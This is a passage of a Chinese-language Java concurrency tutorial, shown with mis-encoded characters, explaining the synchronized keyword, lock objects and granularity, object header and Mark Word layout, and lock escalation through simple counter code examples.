<ul>
<li>é¿å…é”ç«äº‰</li>
<li>é¿å…æ­»é”</li>
<li>æ€§èƒ½æ›´å¥½ï¼ˆåœ¨ä½ç«äº‰æƒ…å†µä¸‹ï¼‰</li>
</ul>
<p><strong>æ— é”ç¼–ç¨‹çš„æŒ‘æˆ˜ï¼š</strong></p>
<ul>
<li>ABAé—®é¢˜</li>
<li>è‡ªæ—‹å¼€é”€</li>
<li>å®ç°å¤æ‚</li>
</ul>
<h2 data-id="heading-50">ç¬¬ä¸‰ç«  synchronizedå…³é”®å­—</h2>
<h3 data-id="heading-51">3.1 synchronizedåŸºç¡€</h3>
<h4 data-id="heading-52">synchronizedçš„ä¸‰ç§ç”¨æ³•</h4>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li>synchronizedæ˜¯Javaä¸­æœ€åŸºæœ¬çš„åŒæ­¥æœºåˆ¶</li>
<li>å¯ä»¥é”ä½ä»£ç å—ï¼Œä¿è¯åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½æ‰§è¡Œ</li>
<li>å°±åƒç»™ä»£ç æ®µåŠ ä¸Š"é—¨é”"ï¼Œä¸€æ¬¡åªå…è®¸ä¸€ä¸ªäººè¿›å…¥</li>
</ul>
<h5 data-id="heading-53">1. ä¿®é¥°å®ä¾‹æ–¹æ³•</h5>
<p><strong>ç”¨æ³•ï¼š</strong> åœ¨æ–¹æ³•å£°æ˜å‰åŠ ä¸Š<code>synchronized</code>å…³é”®å­—</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// é”çš„æ˜¯å½“å‰å®ä¾‹å¯¹è±¡ï¼ˆthisï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        count++;
    }
    
    <span class="hljs-comment">// ç­‰ä»·äºï¼š</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment2</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>) {  <span class="hljs-comment">// ç­‰ä»·å†™æ³•</span>
            count++;
        }
    }
}
</code></pre>
<p><strong>ç‰¹ç‚¹è¯´æ˜ï¼š</strong></p>
<ul>
<li><strong>é”å¯¹è±¡</strong>ï¼šå½“å‰å®ä¾‹å¯¹è±¡ï¼ˆthisï¼‰</li>
<li><strong>ä½œç”¨èŒƒå›´</strong>ï¼šæ•´ä¸ªæ–¹æ³•</li>
<li><strong>äº’æ–¥å…³ç³»</strong>ï¼š
<ul>
<li>âœ… åŒä¸€ä¸ªå®ä¾‹çš„å¤šä¸ªçº¿ç¨‹ä¼šäº’æ–¥</li>
<li>âŒ ä¸åŒå®ä¾‹ä¹‹é—´ä¸äº’æ–¥ï¼ˆå„è‡ªç‹¬ç«‹ï¼‰</li>
</ul>
</li>
</ul>
<p><strong>ç¤ºä¾‹ç†è§£ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Counter</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();
<span class="hljs-type">Counter</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();

<span class="hljs-comment">// çº¿ç¨‹1å’Œçº¿ç¨‹2ä¼šäº’æ–¥ï¼ˆåŒä¸€ä¸ªå®ä¾‹ï¼‰</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; c1.increment()).start();
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; c1.increment()).start();

<span class="hljs-comment">// çº¿ç¨‹3ä¸ä¼šä¸çº¿ç¨‹1ã€2äº’æ–¥ï¼ˆä¸åŒå®ä¾‹ï¼‰</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; c2.increment()).start();
</code></pre>
<h5 data-id="heading-54">2. ä¿®é¥°é™æ€æ–¹æ³•</h5>
<p><strong>ç”¨æ³•ï¼š</strong> åœ¨é™æ€æ–¹æ³•å‰åŠ ä¸Š<code>synchronized</code>å…³é”®å­—</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// é”çš„æ˜¯ç±»å¯¹è±¡ï¼ˆCounter.classï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        count++;
    }
    
    <span class="hljs-comment">// ç­‰ä»·äºï¼š</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment2</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span>(Counter.class) {  <span class="hljs-comment">// ç­‰ä»·å†™æ³•</span>
            count++;
        }
    }
}
</code></pre>
<p><strong>ç‰¹ç‚¹è¯´æ˜ï¼š</strong></p>
<ul>
<li><strong>é”å¯¹è±¡</strong>ï¼šç±»å¯¹è±¡ï¼ˆClasså¯¹è±¡ï¼‰ï¼Œå¦‚<code>Counter.class</code></li>
<li><strong>ä½œç”¨èŒƒå›´</strong>ï¼šæ•´ä¸ªé™æ€æ–¹æ³•</li>
<li><strong>äº’æ–¥å…³ç³»</strong>ï¼š
<ul>
<li>âœ… æ‰€æœ‰å®ä¾‹å…±äº«åŒä¸€æŠŠé”ï¼ˆå› ä¸ºClasså¯¹è±¡åªæœ‰ä¸€ä¸ªï¼‰</li>
<li>âœ… ä¸åŒå®ä¾‹çš„çº¿ç¨‹ä¹Ÿä¼šäº’æ–¥</li>
<li>âŒ é™æ€æ–¹æ³•å’Œå®ä¾‹æ–¹æ³•çš„é”ä¸åŒï¼Œä¸ä¼šäº’æ–¥</li>
</ul>
</li>
</ul>
<p><strong>ç¤ºä¾‹ç†è§£ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Counter</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();
<span class="hljs-type">Counter</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();

<span class="hljs-comment">// çº¿ç¨‹1å’Œçº¿ç¨‹2ä¼šäº’æ–¥ï¼ˆé™æ€æ–¹æ³•ï¼Œå…±äº«ç±»é”ï¼‰</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; Counter.increment()).start();
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; Counter.increment()).start();

<span class="hljs-comment">// å³ä½¿ä¸åŒå®ä¾‹ï¼Œä¹Ÿä¼šäº’æ–¥</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; c1.increment()).start();
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; c2.increment()).start();
<span class="hljs-comment">// è¿™ä¸¤ä¸ªçº¿ç¨‹ä¼šäº’æ–¥ï¼Œå› ä¸ºå®ƒä»¬éƒ½ä½¿ç”¨Counter.classä½œä¸ºé”</span>
</code></pre>
<h5 data-id="heading-55">3. ä¿®é¥°ä»£ç å—</h5>
<p><strong>ç”¨æ³•ï¼š</strong> åœ¨ä»£ç å—å‰åŠ ä¸Š<code>synchronized(å¯¹è±¡)</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// ä¸“ç”¨é”å¯¹è±¡</span>
    
    <span class="hljs-comment">// ä½¿ç”¨æŒ‡å®šçš„é”å¯¹è±¡</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span>(lock) {
            count++;
        }
    }
    
    <span class="hljs-comment">// ä½¿ç”¨thisä½œä¸ºé”ï¼ˆç­‰ä»·äºsynchronizedæ–¹æ³•ï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment2</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>) {
            count++;
        }
    }
    
    <span class="hljs-comment">// ä½¿ç”¨ç±»å¯¹è±¡ä½œä¸ºé”ï¼ˆç­‰ä»·äºsynchronizedé™æ€æ–¹æ³•ï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment3</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span>(Counter.class) {
            <span class="hljs-comment">// é™æ€ä»£ç å—</span>
        }
    }
}
</code></pre>
<p><strong>ç‰¹ç‚¹è¯´æ˜ï¼š</strong></p>
<ul>
<li><strong>çµæ´»æ€§é«˜</strong>ï¼šå¯ä»¥æŒ‡å®šä»»æ„å¯¹è±¡ä½œä¸ºé”</li>
<li><strong>ç²’åº¦æ›´ç»†</strong>ï¼šåªé”ä½å¿…è¦çš„ä»£ç ï¼Œä¸é”æ•´ä¸ªæ–¹æ³•</li>
<li><strong>æ€§èƒ½æ›´å¥½</strong>ï¼šå‡å°‘é”çš„æŒæœ‰æ—¶é—´</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆæ¨èä½¿ç”¨ä»£ç å—ï¼Ÿ</strong></p>
<ul>
<li>å¯ä»¥åªé”ä½å¿…è¦çš„ä»£ç ï¼Œè€Œä¸æ˜¯æ•´ä¸ªæ–¹æ³•</li>
<li>æé«˜å¹¶å‘æ€§èƒ½</li>
<li>æ›´çµæ´»ï¼Œå¯ä»¥ä½¿ç”¨ä¸åŒçš„é”å¯¹è±¡</li>
</ul>
<h4 data-id="heading-56">é”çš„å¯¹è±¡ï¼ˆé‡è¦æ¦‚å¿µï¼‰</h4>
<p><strong>æ ¸å¿ƒåŸåˆ™ï¼šåªæœ‰ä½¿ç”¨åŒä¸€ä¸ªå¯¹è±¡ä½œä¸ºé”ï¼Œæ‰ä¼šäº’æ–¥</strong></p>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li>synchronizedé”çš„æ˜¯<strong>å¯¹è±¡</strong>ï¼Œä¸æ˜¯ä»£ç </li>
<li>å¤šä¸ªçº¿ç¨‹ä½¿ç”¨<strong>åŒä¸€ä¸ªå¯¹è±¡</strong>ä½œä¸ºé” â†’ äº’æ–¥</li>
<li>å¤šä¸ªçº¿ç¨‹ä½¿ç”¨<strong>ä¸åŒå¯¹è±¡</strong>ä½œä¸ºé” â†’ ä¸äº’æ–¥</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// é”1</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// é”2</span>

<span class="hljs-comment">// ä½¿ç”¨lock1ä½œä¸ºé”</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method1</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(lock1) {
        <span class="hljs-comment">// æ“ä½œ1</span>
    }
}

<span class="hljs-comment">// ä½¿ç”¨lock2ä½œä¸ºé”ï¼ˆä¸method1ä¸äº’æ–¥ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method2</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(lock2) {
        <span class="hljs-comment">// æ“ä½œ2</span>
    }
}

<span class="hljs-comment">// ä½¿ç”¨lock1ä½œä¸ºé”ï¼ˆä¸method1äº’æ–¥ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method3</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(lock1) {
        <span class="hljs-comment">// æ“ä½œ3ï¼Œä¸method1äº’æ–¥</span>
    }
}
</code></pre>
<p><strong>äº’æ–¥å…³ç³»æ€»ç»“ï¼š</strong></p>

































<table><thead><tr><th>æ–¹æ³•</th><th>ä½¿ç”¨çš„é”</th><th>method1</th><th>method2</th><th>method3</th></tr></thead><tbody><tr><td>method1</td><td>lock1</td><td>âœ… äº’æ–¥</td><td>âŒ ä¸äº’æ–¥</td><td>âœ… äº’æ–¥</td></tr><tr><td>method2</td><td>lock2</td><td>âŒ ä¸äº’æ–¥</td><td>âœ… äº’æ–¥</td><td>âŒ ä¸äº’æ–¥</td></tr><tr><td>method3</td><td>lock1</td><td>âœ… äº’æ–¥</td><td>âŒ ä¸äº’æ–¥</td><td>âœ… äº’æ–¥</td></tr></tbody></table>
<p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong></p>
<ul>
<li>âš ï¸ é”å¯¹è±¡ä¸èƒ½æ˜¯nullï¼Œå¦åˆ™ä¼šæŠ›å‡º<code>NullPointerException</code></li>
<li>âœ… æ¨èä½¿ç”¨<code>final</code>ä¿®é¥°é”å¯¹è±¡ï¼Œé˜²æ­¢è¢«é‡æ–°èµ‹å€¼</li>
<li>âœ… ä½¿ç”¨ä¸“é—¨çš„é”å¯¹è±¡ï¼ˆå¦‚<code>private final Object lock</code>ï¼‰ï¼Œè€Œä¸æ˜¯thisæˆ–ä¸šåŠ¡å¯¹è±¡</li>
</ul>
<h4 data-id="heading-57">é”çš„ç²’åº¦</h4>
<p><strong>ä»€ä¹ˆæ˜¯é”çš„ç²’åº¦ï¼Ÿ</strong></p>
<ul>
<li><strong>ç²’åº¦</strong>ï¼šé”ä½çš„èŒƒå›´å¤§å°</li>
<li><strong>ç²—ç²’åº¦</strong>ï¼šé”ä½çš„èŒƒå›´å¤§ï¼ˆå¦‚æ•´ä¸ªæ–¹æ³•ï¼‰</li>
<li><strong>ç»†ç²’åº¦</strong>ï¼šé”ä½çš„èŒƒå›´å°ï¼ˆå¦‚å‡ è¡Œä»£ç ï¼‰</li>
</ul>
<p><strong>åŸåˆ™ï¼šå°½é‡ä½¿ç”¨ç»†ç²’åº¦é”ï¼Œæé«˜å¹¶å‘æ€§èƒ½</strong></p>
<h5 data-id="heading-58">ç²—ç²’åº¦é”ï¼ˆä¸æ¨èï¼‰</h5>
<p><strong>é—®é¢˜ï¼š</strong> é”ä½äº†ä¸éœ€è¦é”çš„ä»£ç ï¼Œå¯¼è‡´ä¸å¿…è¦çš„äº’æ–¥</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ ç²—ç²’åº¦é”ï¼šé”ä½æ•´ä¸ªæ–¹æ³•</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count1</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count2</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment1</span><span class="hljs-params">()</span> {
    count1++;
    <span class="hljs-comment">// å…¶ä»–ä¸ç›¸å…³çš„æ“ä½œ...</span>
    <span class="hljs-comment">// æ•´ä¸ªæ–¹æ³•éƒ½è¢«é”ä½ï¼Œå½±å“æ€§èƒ½</span>
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment2</span><span class="hljs-params">()</span> {
    count2++;  
    <span class="hljs-comment">// ä¸increment1äº’æ–¥ï¼Œä½†å®é™…ä¸Šæ²¡å¿…è¦</span>
    <span class="hljs-comment">// å› ä¸ºcount1å’Œcount2æ˜¯ä¸åŒçš„å˜é‡</span>
}
</code></pre>
<p><strong>é—®é¢˜åˆ†æï¼š</strong></p>
<ul>
<li>count1å’Œcount2æ˜¯ä¸åŒçš„å˜é‡ï¼Œäº’ä¸å¹²æ‰°</li>
<li>ä½†ä½¿ç”¨synchronizedæ–¹æ³•ï¼Œå¯¼è‡´å®ƒä»¬äº’æ–¥</li>
<li>é™ä½äº†å¹¶å‘æ€§èƒ½</li>
</ul>
<h5 data-id="heading-59">ç»†ç²’åº¦é”ï¼ˆæ¨èï¼‰</h5>
<p><strong>ä¼˜ç‚¹ï¼š</strong> åªé”ä½å¿…è¦çš„ä»£ç ï¼Œæé«˜å¹¶å‘æ€§</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âœ… ç»†ç²’åº¦é”ï¼šåªé”ä½å¿…è¦çš„ä»£ç </span>
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count1</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count2</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// count1çš„é”</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// count2çš„é”</span>

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment1</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(lock1) {  <span class="hljs-comment">// åªé”count1ç›¸å…³çš„æ“ä½œ</span>
        count1++;
    }
    <span class="hljs-comment">// å…¶ä»–æ“ä½œä¸å—é”å½±å“ï¼Œå¯ä»¥å¹¶å‘æ‰§è¡Œ</span>
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment2</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(lock2) {  <span class="hljs-comment">// åªé”count2ç›¸å…³çš„æ“ä½œ</span>
        count2++;
    }
    <span class="hljs-comment">// ä¸increment1ä¸äº’æ–¥ï¼Œå¯ä»¥åŒæ—¶æ‰§è¡Œ</span>
}
</code></pre>
<p><strong>æ€§èƒ½å¯¹æ¯”ï¼š</strong></p>
<ul>
<li><strong>ç²—ç²’åº¦é”</strong>ï¼šä¸¤ä¸ªçº¿ç¨‹æ“ä½œcount1å’Œcount2æ—¶ï¼Œéœ€è¦ä¸²è¡Œæ‰§è¡Œ</li>
<li><strong>ç»†ç²’åº¦é”</strong>ï¼šä¸¤ä¸ªçº¿ç¨‹æ“ä½œcount1å’Œcount2æ—¶ï¼Œå¯ä»¥å¹¶è¡Œæ‰§è¡Œ</li>
<li><strong>æ€§èƒ½æå‡</strong>ï¼šç»†ç²’åº¦é”æ˜æ˜¾æ›´å¥½</li>
</ul>
<p><strong>æœ€ä½³å®è·µï¼š</strong></p>
<ul>
<li>âœ… ä½¿ç”¨ä¸åŒçš„é”å¯¹è±¡ä¿æŠ¤ä¸åŒçš„èµ„æº</li>
<li>âœ… åªé”ä½å¿…è¦çš„ä»£ç æ®µ</li>
<li>âœ… å°½é‡å‡å°‘é”çš„æŒæœ‰æ—¶é—´</li>
</ul>
<h3 data-id="heading-60">3.2 synchronizedåŸç†</h3>
<h4 data-id="heading-61">å¯¹è±¡å¤´ç»“æ„</h4>
<p><strong>Javaå¯¹è±¡åœ¨å†…å­˜ä¸­çš„å¸ƒå±€ï¼š</strong></p>
<p>æ¯ä¸ªJavaå¯¹è±¡åœ¨å†…å­˜ä¸­éƒ½æœ‰å¯¹è±¡å¤´ï¼Œå¯¹è±¡å¤´ä¸­åŒ…å«äº†é”çš„ä¿¡æ¯ã€‚</p>
<pre><code class="hljs language-css" lang="css">Javaå¯¹è±¡å†…å­˜å¸ƒå±€ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  å¯¹è±¡å¤´ï¼ˆ<span class="hljs-selector-tag">Object</span> <span class="hljs-selector-tag">Header</span>ï¼‰              â”‚
â”‚  â”œâ”€â”€ <span class="hljs-selector-tag">Mark</span> Wordï¼ˆ<span class="hljs-number">8</span>å­—èŠ‚ï¼‰              â”‚ â† é”ä¿¡æ¯å­˜å‚¨åœ¨è¿™é‡Œ
â”‚  â”œâ”€â”€ Class Pointerï¼ˆ<span class="hljs-number">4</span>/<span class="hljs-number">8</span>å­—èŠ‚ï¼‰        â”‚ â† æŒ‡å‘ç±»ä¿¡æ¯
â”‚  â””â”€â”€ Array Lengthï¼ˆ<span class="hljs-number">4</span>å­—èŠ‚ï¼Œä»…æ•°ç»„ï¼‰    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  å®ä¾‹æ•°æ®ï¼ˆInstance Dataï¼‰           â”‚ â† å¯¹è±¡çš„å­—æ®µå€¼
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  å¯¹é½å¡«å……ï¼ˆ<span class="hljs-attribute">Padding</span>ï¼‰                 â”‚ â† å†…å­˜å¯¹é½
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li><strong>Mark Word</strong>ï¼šæœ€é‡è¦çš„éƒ¨åˆ†ï¼Œå­˜å‚¨é”çš„çŠ¶æ€ä¿¡æ¯</li>
<li><strong>Class Pointer</strong>ï¼šæŒ‡å‘ç±»çš„å…ƒæ•°æ®ä¿¡æ¯</li>
<li>JVMé€šè¿‡ä¿®æ”¹Mark Wordæ¥å®ç°é”æœºåˆ¶</li>
</ul>
<h4 data-id="heading-62">Mark Wordè¯¦è§£</h4>
<p><strong>Mark Wordæ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<p>Mark Wordæ˜¯å¯¹è±¡å¤´çš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºå­˜å‚¨å¯¹è±¡è‡ªèº«çš„è¿è¡Œæ—¶æ•°æ®ï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li>å¯¹è±¡çš„å“ˆå¸Œç ï¼ˆhashCodeï¼‰</li>
<li>å¯¹è±¡çš„åˆ†ä»£å¹´é¾„ï¼ˆç”¨äºGCï¼‰</li>
<li><strong>é”çš„æ ‡å¿—ä½ï¼ˆæœ€é‡è¦çš„ï¼‰</strong></li>
</ul>
<p><strong>Mark Wordåœ¨ä¸åŒé”çŠ¶æ€ä¸‹å­˜å‚¨çš„å†…å®¹ï¼š</strong></p>
<p><strong>64ä½JVMçš„Mark Wordç»“æ„ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">Mark</span> Word (<span class="hljs-number">64</span>ä½)
â”œâ”€â”€ é”çŠ¶æ€ï¼ˆ<span class="hljs-number">2</span>ä½ï¼‰ï¼šæ ‡è¯†å½“å‰é”çš„ç±»å‹
â””â”€â”€ å…¶ä»–æ•°æ®ï¼ˆ<span class="hljs-number">62</span>ä½ï¼‰ï¼šæ ¹æ®é”çŠ¶æ€ä¸åŒï¼Œå­˜å‚¨ä¸åŒå†…å®¹

é”çŠ¶æ€åˆ†ç±»ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ é”çŠ¶æ€   â”‚ <span class="hljs-selector-tag">Mark</span> Wordå†…å®¹                        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ æ— é”     â”‚ å¯¹è±¡çš„hashCode + åˆ†ä»£å¹´é¾„ + çŠ¶æ€ä½<span class="hljs-number">01</span>  â”‚
â”‚ åå‘é”   â”‚ çº¿ç¨‹ID + Epoch + åˆ†ä»£å¹´é¾„ + çŠ¶æ€ä½<span class="hljs-number">01</span>  â”‚
â”‚ è½»é‡çº§é” â”‚ æŒ‡å‘æ ˆä¸­é”è®°å½•çš„æŒ‡é’ˆ + çŠ¶æ€ä½<span class="hljs-number">00</span>        â”‚
â”‚ é‡é‡çº§é” â”‚ æŒ‡å‘monitorå¯¹è±¡çš„æŒ‡é’ˆ + çŠ¶æ€ä½<span class="hljs-number">10</span>       â”‚
â”‚ GCæ ‡è®°   â”‚ ç©º + çŠ¶æ€ä½<span class="hljs-number">11</span>                        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li><strong>æ— é”</strong>ï¼šæ­£å¸¸å¯¹è±¡ï¼Œæ²¡æœ‰çº¿ç¨‹ç«äº‰</li>
<li><strong>åå‘é”</strong>ï¼šåªæœ‰ä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨ï¼Œè®°å½•çº¿ç¨‹ID</li>
<li><strong>è½»é‡çº§é”</strong>ï¼šæœ‰ç«äº‰ä½†ä¸æ¿€çƒˆï¼Œä½¿ç”¨CASå’Œè‡ªæ—‹</li>
<li><strong>é‡é‡çº§é”</strong>ï¼šç«äº‰æ¿€çƒˆï¼Œä½¿ç”¨æ“ä½œç³»ç»Ÿçº§åˆ«çš„é”</li>
</ul>
<h4 data-id="heading-63">é”çš„å‡çº§è¿‡ç¨‹</h4>
<p><strong>é”å‡çº§çš„ç›®çš„ï¼š</strong> æ ¹æ®ç«äº‰æƒ…å†µåŠ¨æ€è°ƒæ•´é”ç­–ç•¥ï¼Œåœ¨ä¿è¯çº¿ç¨‹å®‰å…¨çš„å‰æä¸‹ï¼Œå°½å¯èƒ½æé«˜æ€§èƒ½ã€‚</p>
<p><strong>å‡çº§è·¯å¾„ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">æ— é” â†’ åå‘é” â†’ è½»é‡çº§é” â†’ é‡é‡çº§é”
<span class="hljs-code">      ï¼ˆå•å‘å‡çº§ï¼Œä¸èƒ½é™çº§ï¼‰
</span></code></pre>
<h5 data-id="heading-64">æ— é”çŠ¶æ€</h5>
<p><strong>ç‰¹ç‚¹ï¼š</strong> å¯¹è±¡åˆšåˆ›å»ºæ—¶ï¼Œæ²¡æœ‰ä»»ä½•çº¿ç¨‹ä½¿ç”¨ï¼Œå¤„äºæ— é”çŠ¶æ€</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
<span class="hljs-comment">// æ­¤æ—¶objçš„Mark Wordå¤„äºæ— é”çŠ¶æ€</span>
<span class="hljs-comment">// é”æ ‡å¿—ä½ï¼š01ï¼Œæ²¡æœ‰åå‘ä½</span>
</code></pre>
